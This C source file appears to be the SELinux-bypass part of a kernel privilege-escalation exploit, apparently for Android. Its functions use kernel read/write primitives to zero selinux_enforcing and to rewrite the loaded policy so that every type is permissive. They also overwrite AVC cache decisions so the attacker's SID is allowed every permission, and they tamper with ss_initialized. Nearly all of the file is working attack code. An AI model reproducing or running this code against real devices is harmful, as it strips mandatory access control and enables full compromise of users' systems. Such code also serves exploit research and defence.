#include "include/selinux.h"

policydb_t policydb;

int load_policy(char *filename, policydb_t *policy, struct policy_file *pf) {
    int fd;
    struct stat sb;
    void *map;
    int ret;

    fd = open(filename, O_RDONLY);
    if (fd < 0) {
        fprintf(stderr, "[-] Can't open '%s':  %s\n", filename, strerror(errno));
        return 1;
    }
    if (fstat(fd, &sb) < 0) {
        fprintf(stderr, "[-] Can't stat '%s':  %s\n", filename, strerror(errno));
        return 1;
    }
    map = mmap(NULL, sb.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
    if (map == MAP_FAILED) {
        fprintf(stderr, "[-] Can't mmap '%s':  %s\n", filename, strerror(errno));
        close(fd);
        return 1;
    }

    policy_file_init((policy_file_t *) pf);
    pf->type = PF_USE_MEMORY;
    pf->data = map;
    pf->len = sb.st_size;
    if (policydb_init(policy)) {
        fprintf(stderr, "[-] policydb_init: Out of memory!\n");
        munmap(map, sb.st_size);
        close(fd);
        return 1;
    }
    ret = policydb_read(policy, pf, 1);
    if (ret) {
        fprintf(stderr, "[-] error(s) encountered while parsing configuration\n");
        munmap(map, sb.st_size);
        close(fd);
        return 1;
    }

    munmap(map, sb.st_size);
    close(fd);
    return 0;
}

int load_policy_into_kernel(policydb_t *policy) {
    char *filename = "/sys/fs/selinux/load";
    int fd, ret;
    void *data = NULL;
    size_t len;

    policydb_to_image(NULL, policy, &data, &len);
    fd = open(filename, O_RDWR);
    if (fd < 0) {
        fprintf(stderr, "[-] Can't open '%s':  %s\n", filename, strerror(errno));
        return 1;
    }
    ret = write(fd, data, len);
    close(fd);
    if (ret < 0) {
        fprintf(stderr, "[-] Could not write policy to %s\n", filename);
        return 1;
    }
    return 0;
}

void disable_selinux() {
    // we can overwrite selinux_enforcing with 0 else
    const unsigned long selinux_enforcing_addr = KERNEL_BASE + SELINUX_ENFORCING_OFFSET;
    printf("[+] selinux_enforcing is at: 0x%lx\n", selinux_enforcing_addr);
    unsigned int selinux_enforcing = 0; // 0 is for permissive
    kernel_write(selinux_enforcing_addr, &selinux_enforcing, sizeof(selinux_enforcing));
    printf("[+] SELinux is now set permissive !\n");
}

int make_type_permissive(hashtab_key_t k, hashtab_datum_t d, void *args) {
    //printf("-> %s\n", k);
    type_datum_t *t = (type_datum_t *) d;
    ebitmap_set_bit(&policydb.permissive_map, t->s.value, 1);
    return 0;
}

int make_all_types_permissive(policydb_t *policy) {
    return hashtab_map(policy->p_types.table, make_type_permissive, NULL);
}

bool live_with_selinux() {
    char *policy = NULL;
    sidtab_t sidtab;
    struct policy_file pf; // outpf;
    policy = "/sys/fs/selinux/policy";

    // now f idea what that does
    sepol_set_policydb(&policydb);
    sepol_set_sidtab(&sidtab);

    // read policy
    if (load_policy(policy, &policydb, &pf)) {
        fprintf(stderr, "[-] Could not load policy\n");
        return 1;
    }

    if (policydb_load_isids(&policydb, &sidtab))
        return false;

    // update policy
    if (make_all_types_permissive(&policydb) != 0) {
        perror("[-] Could not add rules to policy");
        return false;
    }

    // write policy
    if (load_policy_into_kernel(&policydb)) {
        fprintf(stderr, "[-] Could not overwrite policy\n");
        return false;
    }
    return true;
}

void overwrite_avc_nodes_decisions(unsigned long hlist_node, int sid) {
    unsigned long node = hlist_node;
    while (node != 0) {
        // modify av_decision if the sid matches ours
        unsigned long avc_node = node - AVC_NODE_LIST_OFFSET;
        unsigned int ssid = kernel_read_uint(avc_node);
        if (ssid == sid) {
            unsigned int allowed = kernel_read_uint(
                    avc_node + AVC_ENTRY_AVD_OFFSET + AV_DECISION_ALLOWED_OFFSET);
            //printf("[ssid=%u,allowed=%x,node=%lx]--->", ssid, allowed, node);
            // overwrite av_decision.allowed
            kernel_write_uint(avc_node + AVC_ENTRY_AVD_OFFSET + AV_DECISION_ALLOWED_OFFSET,
                              0xffffffff);
        } else {
            //printf("node=%lx--->", node);
        }

        node = kernel_read_ulong(node);
    }
    //printf("X\n");
}

void overwrite_avc_cache(unsigned long avc_cache_addr, int sid) {
    /**
     * Got through each of the 512-slots of avc_cache. For each slot, go through
     * the hlist of avc_node. If the sid is ours then overwrite avc_decision -> allowed.
     */
    for (int i = 0; i < AVC_CACHE_SLOTS; i++) {
        unsigned long slot_addr = avc_cache_addr + i * 8;
        unsigned long hlist_node_addr = kernel_read_ulong(slot_addr); // point on avc_node.list
        //printf("@slots[%d]=%lx, slots[%d]=%lx--->", i, slot_addr, i, hlist_node_addr);
        overwrite_avc_nodes_decisions(hlist_node_addr, sid);
    }
}

void set_ss_initialized(unsigned long ss_initialized, unsigned int value) {
    printf("[+] ss_initialized=%u !\n", value);
    kernel_write_uint(ss_initialized, value);
}